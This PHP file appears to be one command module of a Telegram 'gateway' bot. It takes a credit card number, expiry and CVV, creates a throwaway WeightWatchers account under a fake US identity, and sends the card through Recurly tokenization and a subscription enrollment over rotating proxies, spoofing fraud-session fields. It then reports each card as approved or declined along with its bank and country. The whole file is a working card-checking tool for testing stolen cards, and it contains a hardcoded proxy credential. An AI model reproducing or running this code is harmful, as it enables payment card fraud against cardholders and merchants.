<?php

$gatewayname="rec";
if (preg_match('/^[\/\.,\$](?:'.$gatewayname.')(?:\s+(.+))?$/i', $message, $matches)) {
    //==================[Inicializacion de variables]======================//
    $messages = $bot->loadPlantillas();
    $gateway =  $gateway = "#recurly_Auth (".'$rec'.")";
    $lang = $db->getUserLanguage($userId);
  //==================[Manejo de los Usuarios]======================//
   $accessMessage = $db->verifyUserAccess($userId, $chat_id,'$'.$gatewayname);
if ($accessMessage !== null) {
$bot->callApi('sendMessage', [
    'chat_id' => $chat_id,
    'text' => $bot->translateTemplate($accessMessage, 'en', $lang),
    'parse_mode' => 'html',
    'reply_to_message_id' => $message_id,
    'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
    ])
    ]);
    return; 
    }
//==================[Mensaje configuracion y time]======================//
$lista = $bot->getCleanList($message, $replyMessageText);
$starttim = microtime(true);
//==================[REGEX]======================//
$validationResult = $bot->validateCreditCard($lista);
if (is_string($validationResult)) {
    $editmessage = $bot->callApi('SendMessage', [
        'chat_id' => $chat_id,
        'text' => $bot->translateTemplate($validationResult, 'en', $lang),
        'parse_mode' => 'html',
        'reply_to_message_id' => $message_id,
        'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true

    ])
    ]);
    sleep(3);
    $bot->callApi('deleteMessage', [
        'chat_id' => $chat_id,
        'message_id' => $editmessage 
    ]);
    return;
}

$cc = $validationResult['cc'];
$mes = $validationResult['mes'];
$ano = $validationResult['ano'];
$ano1 = (strlen($year) == 2) ? $ano : substr($ano, 2);
$cvv = $validationResult['cvv'];
$creditcard = $validationResult['creditcard'];
    //==================[Antispam]======================//
    $antispam = $db->antispamCheck($userId,$username?:$firstname);

    if($antispam != False){
        $editmessage = $bot->callApi('sendmessage',[
        'chat_id'=>$chat_id,
        'text'=>$antispam,
        'parse_mode'=>'html',
        'reply_to_message_id'=> $message_id,
        'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
    
        ])
      ]);
      sleep(3);
      $bot->callApi('deleteMessage', [
          'chat_id' => $chat_id,
          'message_id' => $editmessage 
      ]);
      return;
    }
$editmessage = $bot->callApi('SendMessage', [
    'chat_id' => $chat_id,
    'text' => sprintf(
        $bot->translateTemplate($messages['vSiesta_gateway'], 'en', $lang),
$gateway,
    $creditcard),
    'parse_mode' => 'html',
    'reply_to_message_id' => $message_id,
    'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
    ])
]);
    
 //==================[Random Direcciones]======================//
    $userData = Fake::GetUser('US');

    $firstName = $userData['first_name'];
    $lastName = $userData['last_name'];
    $username1 = $userData['username'];
    $email = $userData['email'];
    $password = $userData['password'];
    $phone = $userData['phone']['format2'];
    $userAgent = $userData['userAgent'];

    $street = $userData['street'];
    $country = $userData['country'];
    $iso2 = $userData['iso2'];
    $state = $userData['state'];
    $state_id = $userData['state_id'];
    $city = $userData['city'];
    $zip = $userData['zip'];
 //==================[Bin Verificador]======================//
    $bin = substr($cc, 0, 6);
    $resultado = $bot->verificarBin($bin);

    if (!is_string($resultado)) { // Verificamos que no sea un mensaje de error
        $brand = $resultado['brand'];
        $country = $resultado['country'];
        $country_name = $resultado['country_name'];
        $country_flag = $resultado['country_flag'];
        $country_currencies = $resultado['country_currencies'];
        $bank = $resultado['bank'];
        $level = $resultado['level'];
        $type = $resultado['type'];
    } else {
        $bot->callApi('EditMessageText', [
            'chat_id' => $chat_id,
            'text' => $resultado,
            'parse_mode' => 'html',
            'message_id' => $editmessage,
         
        ]);
        exit();
    }
    
 //==================[Proxys y Cookies]======================//
$socks5 = "gw.dataimpulse.com:823";
$rotate = "b097452cc0d2c2bcc268:7580f00952ea0161";

$cookie = uniqid();


$proxies = ["METHOD" => "CUSTOM", "SERVER" => $socks5, "AUTH" => $rotate];

 //==================[Curl Request]======================//
 $response = CurlX::Post(
    "https://api.ww.com/account/v1/check/email?market=en-US",
    '{"key":"'.$email.'"}',
    [
        'content-type: application/json',
        'origin: https://www.weightwatchers.com',
        'priority: u=1, i',
        'referer: https://www.weightwatchers.com/',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'ww-client: rsw',
        'ww-ssid: en-US-1971192318.1730294'
    ],
    $cookie,
    $proxies
);


$response = CurlX::Post(
    "https://api.ww.com/account/v1/profile/register?market=en-US",
    '{"firstname":"'.$firstName.'","lastname":"'.$lastName.'","email":"'.$email.'","password":"Passwo342","timezone":"-05:00","optin":"email"}',
    [
        'content-type: application/json',
        'origin: https://www.weightwatchers.com',
        'priority: u=1, i',
        'referer: https://www.weightwatchers.com/',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'ww-client: rsw',
        'ww-ssid: en-US-1971192318.1730294'
    ],
    $cookie,
    $proxies
);
$id_token = CurlX::ParseString($response->body,'"id_token":"','","loginSuccess"');



$response = CurlX::Post(
    "https://api.recurly.com/js/v1/token",
    'fraud_session_id=744c69a63ebbcf5ae01bc44ea8ad1599&first_name=luis&last_name=pere&address1=232%20Street%20Road&city=Bensalem&state=PA&postal_code=19020&country=US&phone=7283266722&number='.$cc.'&fraud[0][processor]=kount&fraud[0][session_id]=744c69a63ebbcf5ae01bc44ea8ad1599&browser[color_depth]=24&browser[java_enabled]=false&browser[language]=es-419&browser[referrer_url]=https%3A%2F%2Fwww.weightwatchers.com%2Fus%2Fsignup%2Fr%2Fpayment%3Fop%3D460b2ff5-25a7-4a11-b1ed-2f636201ad95%26own%3D37%26ob%3Df1dcee92-491d-4280-a90c-2ea314379133%26returnPath%3D%252Fplans&browser[screen_height]=768&browser[screen_width]=1366&browser[time_zone_offset]=300&browser[user_agent]=Mozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Safari%2F537.36&month='.$mes.'&year='.$ano.'&cvv='.$cvv.'&version=4.32.1&key=ewr1-shv8o27mJEHUWR0L6GVUWE&deviceId=3tcHbUYE6b3f3iYh&sessionId=UIim5rv47qxVE2B3&instanceId=4mqVmEnstUzFr6Wp',
    [
        'accept: */*',
        'accept-language: es-419,es;q=0.9',
        'priority: u=1, i',
        'referer: https://api.recurly.com/js/v1/field.html',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36'
    ],
    $cookie,
    $proxies
);

$id = CurlX::ParseString($response->body,'"id":"','"');

$response = CurlX::Post(
    "https://api.ww.com/sms/v1/subscriptions/enroll?locale=en-US&source=checkout",
    '{"offerPlanId":"460b2ff5-25a7-4a11-b1ed-2f636201ad95","billingInfo":{"tokenId":"'.$id.'","paymentMethodType":"creditCard"}}',
    [
        'accept: application/json, text/plain, */*',
        'authorization: Bearer '.$id_token.'',
        'content-type: application/json',
        'origin: https://www.weightwatchers.com',
        'referer: https://www.weightwatchers.com/',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'ww-client: rsw',
        'ww-ssid: en-US-1971192318.1730294'
    ],
    $cookie,
    $proxies
);

file_put_contents(__DIR__ . "/../Responses/".str_replace(' ', '', trim($gateway)).".txt",$response->body);

 //==================[Manejo de los mensajes]======================//

 $data = json_decode($response->body, true);

 if (isset($data['explanation']['fraudInfo']['decision']) && $data['explanation']['fraudInfo']['decision'] === 'approve') {
    $errormessage = "Approved";
}
if (isset($data['code'])) {
    $code= $data['code'];
    $errormessage = CurlX::ParseString($response->body,'"message":"','"');
} 

 if($errormessage=="null"||!$errormessage){
    $errormessage = "There was a problem processing the request";
    file_put_contents(__DIR__ . "/../Responses/".str_replace(' ', '', trim($gateway)).".txt",$response->body);
} 
 //==================[Fin time]======================//
$starttime = intval(microtime(true) - $starttim);
 //==================[Manejo del bot]======================//
 $lang = $db->getUserLanguage($userId);
 if($errormessage == "approved"){

    $bot->callApi('EditMessageText', [
        'chat_id' => $chat_id,
        'text' => sprintf(
            $bot->translateTemplate($messages['gateway'], 'en', $lang),
            $gateway,
            $creditcard,
            $bot->translateText("Approved!✅", "en", $lang),
            "$code $errormessage",
            "$type - $level",
            $bank,
            "$country_name$country_flag",
            $starttime,
            $username ?: $firstname
        ),
        'parse_mode' => 'html',
        'message_id' => $editmessage,
        'reply_markup' => json_encode([
            'inline_keyboard' => $messages['buttons_gateways'],
            'resize_keyboard' => true
        ])
    ]);
 }
 else{
$bot->callApi('EditMessageText', [
    'chat_id' => $chat_id,
    'text' => sprintf(
        $bot->translateTemplate($messages['gateway'], 'en', $lang),
        $gateway,
        $creditcard,
        $bot->translateText("Declined!❌", "en", $lang),
        "$code $errormessage",
        "$type - $level",
        $bank,
        "$country_name$country_flag",
        $starttime,
        $username ?: $firstname
    ),
    'parse_mode' => 'html',
    'message_id' => $editmessage,
    'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
 
        ])
    ]);
}}
